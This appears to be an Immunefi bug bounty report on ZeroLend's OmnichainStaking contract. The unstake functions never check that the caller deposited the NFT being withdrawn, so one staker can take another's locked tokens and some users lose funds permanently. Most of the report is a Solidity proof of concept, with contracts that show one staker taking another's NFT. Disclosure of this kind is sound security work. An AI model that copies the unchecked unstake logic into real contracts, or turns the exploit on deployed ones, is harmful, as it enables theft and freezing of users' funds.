# 29103 - \[SC - Critical] Omnichain Stakers can permanently lose access t...

Submitted on Mar 7th 2024 at 03:49:33 UTC by @Trust for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29103

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/zerolend/governance>

Impacts:

* Permanent freezing of funds

## Description

## Brief/Intro

The OmnichainStaking faciliates staking of Locker NFTs. When Locker NFT arrive to Staking, it credits the beneficiary with equivalent `lpPower` or `tokenPower` for the `power` of the sent NFT. Users can later redeem their NFTs by passing their tokenID to `unstakeLP()` or `unstakeToken()`. They will burn the power minted, and get access back to their NFT.

## Vulnerability Details

The following two facts result in potential permanent freezing of tokens

* There is a lack of check that the tokenID being unstaked is the original one deposited by the user.
* A user with power P will not be able to fetch other user's tokenID unless they have a lower P. This means the lowest P will not be able to fetch any tokenID as compensation.

Another critical impact is that someone may cash out another user's tokenID to get premature access to their funds. The two tokens may have identical power, but one is almost expired while the other just started.

## Impact Details

Users can permanently lose access to their underlying Zero tokens.

## Proof of Concept

The single file POC below shows staker s2 has access to s1's NFT. Simple deploy the contract and run `showBrokenStaking()` of BaseLockerPOC.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {IERC721Receiver} from "@openzeppelin/contracts/interfaces/IERC721Receiver.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {IERC165, ERC721EnumerableUpgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC721/extensions/ERC721EnumerableUpgradeable.sol";
import {ReentrancyGuardUpgradeable} from "@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol";

import {IERC721} from "@openzeppelin/contracts/interfaces/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/interfaces/IERC721Receiver.sol";
import {IVotes} from "@openzeppelin/contracts/governance/utils/IVotes.sol";
import {OApp} from "@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/OApp.sol";
import {Votes} from "@openzeppelin/contracts/governance/utils/Votes.sol";
interface IOmnichainStaking is IVotes {
    struct StakeInformation {
        address owner;
        uint256 tokenStake;
        uint256 lpStake;
        uint256 localVe;
    }

    // An omni-chain staking contract that allows users to stake their veNFT
    // and get some voting power. Once staked the voting power is available cross-chain.

    function unstakeLP(uint256 tokenId) external;

    function unstakeToken(uint256 tokenId) external;

    /// @dev using layerzero, sends the updated voting power across the different chains
    function updatePowerOnChain(uint256 chainId, uint256 nftId) external;

    /// @dev using layerzero, deletes the updated voting power across the different chains
    function deletePowerOnChain(uint256 chainId, uint256 nftId) external;

    /// @dev send the veStaked supply to the mainnet
    function updateSupplyToMainnetViaLZ() external;

    /// @dev receive the veStaked supply on the mainnet
    function updateSupplyFromLZ() external;
}


import {IERC721Enumerable} from "@openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol";

interface ILocker is IERC721Enumerable {
    function balanceOfNFT(uint256 _tokenId) external view returns (uint256);

    function balanceOfNFTAt(
        uint256 _tokenId,
        uint256 _t
    ) external view returns (uint256);
}


import {ERC20VotesUpgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20VotesUpgradeable.sol";

interface IZeroLocker is IERC721 {

    function trustAddress(address addr) external;

    function init(
        address _token,
        address _staking,
        address _stakingBonus
    ) external;

    function supply() external returns (uint256);

    function balanceOfNFT(uint256) external view returns (uint256);

    function merge(uint256 _from, uint256 _to) external;

    function depositFor(uint256 _tokenId, uint256 _value) external;

    function createLockFor(
        uint256 _value,
        uint256 _lockDuration,
        address _to,
        bool _stakeNFT
    ) external returns (uint256);

    function createLock(
        uint256 _value,
        uint256 _lockDuration,
        bool _stakeNFT
    ) external returns (uint256);

    enum DepositType {
        DEPOSIT_FOR_TYPE,
        CREATE_LOCK_TYPE,
        INCREASE_LOCK_AMOUNT,
        INCREASE_UNLOCK_TIME,
        MERGE_TYPE
    }

    struct LockedBalance {
        uint256 amount;
        uint256 end;
        uint256 start;
        uint256 power;
    }

    event Deposit(
        address indexed provider,
        uint256 tokenId,
        uint256 value,
        uint256 indexed locktime,
        DepositType deposit_type,
        uint256 ts
    );

    event Withdraw(
        address indexed provider,
        uint256 tokenId,
        uint256 value,
        uint256 ts
    );

    event Supply(uint256 prevSupply, uint256 supply);
}


/**
  @title Voting Escrow
  @author Curve Finance
  @notice Votes have a weight depending on time, so that users are
  committed to the future of (whatever they are voting for)
  @dev Vote weight decays linearly over time. Lock time cannot be
  more than `MAXTIME` (4 years).

  # Voting escrow to have time-weighted votes
  # Votes have a weight depending on time, so that users are committed
  # to the future of (whatever they are voting for).
  # The weight in this implementation is linear, and lock cannot be more than maxtime:
  # w ^
  # 1 +        /
  #   |      /
  #   |    /
  #   |  /
  #   |/c
  # 0 +--------+------> time
  # maxtime (4 years?)
*/

abstract contract BaseLocker is
    ReentrancyGuardUpgradeable,
    ERC721EnumerableUpgradeable,
    IZeroLocker
{
    uint256 internal WEEK;
    uint256 internal MAXTIME;
    uint256 internal MULTIPLIER;

    uint256 public supply;
    mapping(uint256 => LockedBalance) public locked;

    string public version;
    uint8 public decimals;

    /// @dev Current count of token
    uint256 internal tokenId;

    IERC20 public underlying;
    IOmnichainStaking public staking;

    function trustAddress(address addr) external {
        _setApprovalForAll(address(this), addr, true);
    }

    function __BaseLocker_init(
        string memory _name,
        string memory _symbol,
        address _token,
        address _staking,
        address _stakingBonus,
        uint256 _maxTime
    ) internal {
        __ERC721_init(_name, _symbol);
        __ReentrancyGuard_init();

        version = "1.0.0";
        decimals = 18;

        WEEK = 1 weeks;
        MAXTIME = _maxTime;
        MULTIPLIER = 1 ether;

        staking = IOmnichainStaking(_staking);
        underlying = IERC20(_token);

        _setApprovalForAll(address(this), _stakingBonus, true);
        _setApprovalForAll(address(this), _staking, true);
    }

    /// @dev Interface identification is specified in ERC-165.
    /// @param _interfaceID Id of the interface
    function supportsInterface(
        bytes4 _interfaceID
    )
        public
        view
        override(ERC721EnumerableUpgradeable, IERC165)
        returns (bool)
    {
        return ERC721EnumerableUpgradeable.supportsInterface(_interfaceID);
    }

    /// @notice Get timestamp when `_tokenId`'s lock finishes
    /// @param _tokenId User NFT
    /// @return Epoch time of the lock end
    function lockedEnd(uint256 _tokenId) external view returns (uint256) {
        return locked[_tokenId].end;
    }

    /// @dev Returns the voting power of the `_owner`.
    ///      Throws if `_owner` is the zero address. NFTs assigned to the zero address are considered invalid.
    /// @param _owner Address for whom to query the voting power of.
    function votingPowerOf(
        address _owner
    ) external view returns (uint256 _power) {
        for (uint256 index = 0; index < balanceOf(_owner); index++) {
            uint256 _tokenId = tokenOfOwnerByIndex(_owner, index);
            _power += balanceOfNFT(_tokenId);
        }
    }

    function _calculatePower(
        LockedBalance memory lock
    ) internal view returns (uint256) {
        return ((lock.end - lock.start) * lock.amount) / MAXTIME;
    }

    /// @notice Deposit and lock tokens for a user
    /// @param _tokenId NFT that holds lock
    /// @param _value Amount to deposit
    /// @param _unlockTime New time when to unlock the tokens, or 0 if unchanged
    /// @param _lock Previous locked amount / timestamp
    /// @param _type The type of deposit
    function _depositFor(
        uint256 _tokenId,
        uint256 _value,
        uint256 _unlockTime,
        LockedBalance memory _lock,
        DepositType _type
    ) internal {
        LockedBalance memory lock = _lock;
        uint256 supplyBefore = supply;

        supply = supplyBefore + _value;
        LockedBalance memory oldLocked;
        (oldLocked.amount, oldLocked.end, oldLocked.power) = (
            lock.amount,
            lock.end,
            lock.power
        );

        // Adding to existing lock, or if a lock is expired - creating a new one
        lock.amount += _value;
        if (_unlockTime != 0) lock.end = _unlockTime;
        if (_type == DepositType.CREATE_LOCK_TYPE) lock.start = block.timestamp;

        lock.power = _calculatePower(lock);
        locked[_tokenId] = lock;

        // Possibilities:
        // Both oldLocked.end could be current or expired (>/< block.timestamp)
        // value == 0 (extend lock) or value > 0 (add to lock or extend lock)
        // _locked.end > block.timestamp (always)

        if (_value != 0 && _type != DepositType.MERGE_TYPE)
            assert(underlying.transferFrom(msg.sender, address(this), _value));

        emit Deposit(
            msg.sender,
            _tokenId,
            _value,
            lock.end,
            _type,
            block.timestamp
        );
        emit Supply(supplyBefore, supplyBefore + _value);
    }

    function merge(uint256 _from, uint256 _to) external override {
        require(_from != _to, "same nft");
        require(
            _isAuthorized(ownerOf(_from), msg.sender, _from),
            "from not approved"
        );
        require(
            _isAuthorized(ownerOf(_to), msg.sender, _to),
            "to not approved"
        );

        LockedBalance memory _locked0 = locked[_from];
        LockedBalance memory _locked1 = locked[_to];
        uint256 value0 = uint256(int256(_locked0.amount));
        uint256 end = _locked0.end >= _locked1.end
            ? _locked0.end
            : _locked1.end;

        locked[_from] = LockedBalance(0, 0, 0, 0);

        _burn(_from);
        _depositFor(_to, value0, end, _locked1, DepositType.MERGE_TYPE);
    }

    /// @notice Deposit `_value` tokens for `_tokenId` and add to the lock
    /// @dev Anyone (even a smart contract) can deposit for someone else, but
    ///      cannot extend their locktime and deposit for a brand new user
    /// @param _tokenId lock NFT
    /// @param _value Amount to add to user's lock
    function depositFor(
        uint256 _tokenId,
        uint256 _value
    ) external override nonReentrant {
        LockedBalance memory _locked = locked[_tokenId];

        require(_value > 0, "value = 0"); // dev: need non-zero value
        require(_locked.amount > 0, "No existing lock found");
        require(_locked.end > block.timestamp, "Cannot add to expired lock.");
        _depositFor(_tokenId, _value, 0, _locked, DepositType.DEPOSIT_FOR_TYPE);
    }

    /// @notice Deposit `_value` tokens for `_to` and lock for `_lockDuration`
    /// @param _value Amount to deposit
    /// @param _lockDuration Number of seconds to lock tokens for (rounded down to nearest week)
    /// @param _to Address to deposit
    function createLockFor(
        uint256 _value,
        uint256 _lockDuration,
        address _to,
        bool _stakeNFT
    ) external override nonReentrant returns (uint256) {
        return _createLock(_value, _lockDuration, _to, _stakeNFT);
    }

    /// @notice Deposit `_value` tokens for `msg.sender` and lock for `_lockDuration`
    /// @param _value Amount to deposit
    /// @param _lockDuration Number of seconds to lock tokens for (rounded down to nearest week)
    /// @param _stakeNFT Should we also stake the NFT as well?
    function createLock(
        uint256 _value,
        uint256 _lockDuration,
        bool _stakeNFT
    ) external override nonReentrant returns (uint256) {
        return _createLock(_value, _lockDuration, msg.sender, _stakeNFT);
    }

    /// @notice Deposit `_value` additional tokens for `_tokenId` without modifying the unlock time
    /// @param _value Amount of tokens to deposit and add to the lock
    function increaseAmount(
        uint256 _tokenId,
        uint256 _value
    ) external nonReentrant {
        require(
            _isAuthorized(_ownerOf(_tokenId), msg.sender, _tokenId),
            "caller is not owner nor approved"
        );
        LockedBalance memory _locked = locked[_tokenId];

        assert(_value > 0); // dev: need non-zero value
        require(_locked.amount > 0, "No existing lock found");
        require(_locked.end > block.timestamp, "Cannot add to expired lock.");

        _depositFor(
            _tokenId,
            _value,
            0,
            _locked,
            DepositType.INCREASE_LOCK_AMOUNT
        );
    }

    /// @notice Extend the unlock time for `_tokenId`
    /// @param _lockDuration New number of seconds until tokens unlock
    function increaseUnlockTime(
        uint256 _tokenId,
        uint256 _lockDuration
    ) external nonReentrant {
        require(
            _isAuthorized(ownerOf(_tokenId), msg.sender, _tokenId),
            "caller is not owner nor approved"
        );

        LockedBalance memory _locked = locked[_tokenId];
        uint256 unlockTime = ((block.timestamp + _lockDuration) / WEEK) * WEEK; // Locktime is rounded down to weeks

        require(_locked.end > block.timestamp, "Lock expired");
        require(_locked.amount > 0, "Nothing is locked");
        require(unlockTime > _locked.end, "Can only increase lock duration");
        require(
            unlockTime <= block.timestamp + MAXTIME,
            "Voting lock can be 4 years max"
        );
        require(
            unlockTime <= _locked.start + MAXTIME,
            "Voting lock can be 4 years max"
        );

        _depositFor(
            _tokenId,
            0,
            unlockTime,
            _locked,
            DepositType.INCREASE_UNLOCK_TIME
        );
    }

    /// @notice Withdraw all tokens for `_tokenId`
    /// @dev Only possible if the lock has expired
    function withdraw(uint256 _tokenId) external nonReentrant {
        require(
            _isAuthorized(ownerOf(_tokenId), msg.sender, _tokenId),
            "caller is not owner nor approved"
        );

        LockedBalance memory _locked = locked[_tokenId];
        require(block.timestamp >= _locked.end, "The lock didn't expire");
        uint256 value = uint256(int256(_locked.amount));

        locked[_tokenId] = LockedBalance(0, 0, 0, 0);
        uint256 supplyBefore = supply;
        supply = supplyBefore - value;

        assert(underlying.transfer(msg.sender, value));

        // Burn the NFT
        _burn(_tokenId);

        emit Withdraw(msg.sender, _tokenId, value, block.timestamp);
        emit Supply(supplyBefore, supplyBefore - value);
    }

    /// @notice Deposit `_value` tokens for `_to` and lock for `_lockDuration`
    /// @param _value Amount to deposit
    /// @param _lockDuration Number of seconds to lock tokens for (rounded down to nearest week)
    /// @param _to Address to deposit
    /// @param _stakeNFT should we stake into the staking contract
    function _createLock(
        uint256 _value,
        uint256 _lockDuration,
        address _to,
        bool _stakeNFT
    ) internal returns (uint256) {
        uint256 unlockTime = ((block.timestamp + _lockDuration) / WEEK) * WEEK; // Locktime is rounded down to weeks

        require(_value > 0, "value = 0"); // dev: need non-zero value
        require(unlockTime > block.timestamp, "Can only lock in the future");
        require(
            unlockTime <= block.timestamp + MAXTIME,
            "Voting lock can be 4 years max"
        );

        ++tokenId;
        uint256 _tokenId = tokenId;

        _depositFor(
            _tokenId,
            _value,
            unlockTime,
            locked[_tokenId],
            DepositType.CREATE_LOCK_TYPE
        );

        // if the user wants to stake the NFT then we mint to the contract and
        // stake on behalf of the user
        if (_stakeNFT) {
            _mint(address(this), _tokenId);
            bytes memory data = abi.encode(_to);
            // Bug fix!
            IERC721(address(this)).safeTransferFrom(address(this), address(staking), _tokenId, data);
            //safeTransferFrom(address(this), address(staking), _tokenId, data);
        } else _mint(_to, _tokenId);

        return _tokenId;
    }

    function balanceOfNFT(uint256 _tokenId) public view returns (uint256) {
        return locked[_tokenId].power;
    }

    function tokenURI(
        uint256
    ) public view virtual override returns (string memory) {
        // todo
        return "";
    }
}

contract LockerToken is BaseLocker {
    function init(
        address _token,
        address _staking,
        address _stakingBonus
    ) external initializer {
        __BaseLocker_init(
            "Locked ZERO Tokens",
            "T-ZERO",
            _token,
            _staking,
            _stakingBonus,
            4 * 365 * 86400
        );
    }
}

contract Zero is ERC20 {
    constructor() ERC20("Zero","ZRO") {
        _mint(msg.sender, 100_000 * 1e18);
    }
}

// ███████╗███████╗██████╗  ██████╗
// ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗
//   ███╔╝ █████╗  ██████╔╝██║   ██║
//  ███╔╝  ██╔══╝  ██╔══██╗██║   ██║
// ███████╗███████╗██║  ██║╚██████╔╝
// ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝

// Website: https://zerolend.xyz
// Discord: https://discord.gg/zerolend
// Twitter: https://twitter.com/zerolendxyz


// An omni-chain staking contract that allows users to stake their veNFT
// and get some voting power. Once staked the voting power is available cross-chain.
contract OmnichainStaking is IOmnichainStaking, ERC20VotesUpgradeable {
    ILocker public lpLocker;
    ILocker public tokenLocker;

    mapping(uint256 => uint256) public lpPower;
    mapping(uint256 => uint256) public tokenPower;

    // constructor() {
    //     _disableInitializers();
    // }

    function init(
        address, // LZ endpoint
        address _tokenLocker,
        address _lpLocker
    ) external initializer {
        // TODO add LZ
        __ERC20Votes_init();
        __ERC20_init("ZERO Voting Power", "ZEROvp");

        tokenLocker = ILocker(_tokenLocker);
        lpLocker = ILocker(_lpLocker);
    }

    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        require(
            msg.sender == address(lpLocker) ||
                msg.sender == address(tokenLocker),
            "only lockers"
        );

        if (data.length > 0) from = abi.decode(data, (address));

        // if the stake is from the LP locker, then give 4 times the voting power
        if (msg.sender == address(lpLocker)) {
            lpPower[tokenId] = lpLocker.balanceOfNFT(tokenId);
            _mint(from, lpPower[tokenId] * 4);
        }
        // if the stake is from a regular token locker, then give 1 times the voting power
        else if (msg.sender == address(tokenLocker)) {
            tokenPower[tokenId] = tokenLocker.balanceOfNFT(tokenId);
            _mint(from, tokenPower[tokenId]);
        } else require(false, "invalid operator");

        return this.onERC721Received.selector;
    }

    function unstakeLP(uint256 tokenId) external {
        _burn(msg.sender, lpPower[tokenId] * 4);
        lpLocker.safeTransferFrom(address(this), msg.sender, tokenId);
    }

    function unstakeToken(uint256 tokenId) external {
        _burn(msg.sender, tokenPower[tokenId]);
        tokenLocker.safeTransferFrom(address(this), msg.sender, tokenId);
    }

    function updatePowerOnChain(uint256 chainId, uint256 nftId) external {
        // TODO
        // ensure that the user has no votes anywhere and no delegation then send voting
        // power to another chain.
        // using layerzero, sends the updated voting power across the different chains
    }

    function deletePowerOnChain(uint256 chainId, uint256 nftId) external {
        // TODO
        // using layerzero, deletes the updated voting power across the different chains
    }

    function updateSupplyToMainnetViaLZ() external {
        // TODO
        // send the veStaked supply to the mainnet
    }

    function updateSupplyFromLZ() external {
        // TODO
        // receive the veStaked supply on the mainnet
    }

    function transfer(address, uint256) public pure override returns (bool) {
        // don't allow users to transfer voting power. voting power can only
        // be minted or burnt and act like SBTs
        require(false, "transfer disabled");
        return false;
    }

    function transferFrom(
        address,
        address,
        uint256
    ) public pure override returns (bool) {
        // don't allow users to transfer voting power. voting power can only
        // be minted or burnt and act like SBTs
        require(false, "transferFrom disabled");
        return false;
    }
}





//contract BaseLockerPOC {
//    LockerToken public locker;
//    Zero public zero;
//    OmnichainStaking public staking;
//
//    constructor() {
//        zero = new Zero();
//        staking = new OmnichainStaking();
//        locker = new LockerToken();
//        staking.init(address(0x0), address(locker), address(0x0));        
//        locker.init(address(zero), address(staking), address(0x1));
//        IERC20(zero).approve(address(locker), 2**256-1);
////
////
//        require(locker.supply() == 0);
//    }
//
//    function inflate_supply() external {
//        uint tok1 = locker.createLock(10, 6 * 3600 * 24 * 7 , false);
//        uint tok2 = locker.createLock(10, 4 * 3600 * 24 * 7, false);
//        require(tok1 == 1);
//        require(tok2 == 2);
//        require(locker.supply() == 20);
//        locker.merge(tok1, tok2);
//        require(locker.supply() == 30);
//    }
//
//}


contract BaseLockerPOC {
    IZeroLocker public locker;
    Zero public zero;
    OmnichainStaking public staking;
    Staker s1;
    Staker s2;

    constructor() {
        zero = new Zero();
        staking = new OmnichainStaking();
        locker = new LockerToken();
        staking.init(address(0x0), address(locker), address(0x0));        
        locker.init(address(zero), address(staking), address(0x1));
        IERC20(zero).approve(address(locker), 2**256-1);
//
//
        require(locker.supply() == 0);
        s1 = new Staker(locker,zero,staking);
        s2 = new Staker(locker,zero,staking);
        zero.transfer(address(s1), 10e18);
        zero.transfer(address(s2), 20e18);

        
    }

    function showBrokenStaking() external {
        s1.stake(10e18);        
        s2.stake(20e18);
        s2.unstake(1);  
        //s1.unstake(1);
    }


}

contract Staker {
    IZeroLocker public locker;
    Zero public zero;
    OmnichainStaking public staking;


    constructor(IZeroLocker l, Zero z, OmnichainStaking s) {
        locker = l;
        zero = z;
        staking = s;
        IERC20(zero).approve(address(locker), 2**256-1);
    }

    function stake(uint amount) external {
        IERC721(locker).setApprovalForAll(address(locker), true);
        locker.createLock(amount, 6 * 3600 * 24 * 7 , true);
    }

    function unstake(uint tokenID) external {
        staking.unstakeToken(tokenID);
    }

    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
    return this.onERC721Received.selector;
}

}
```
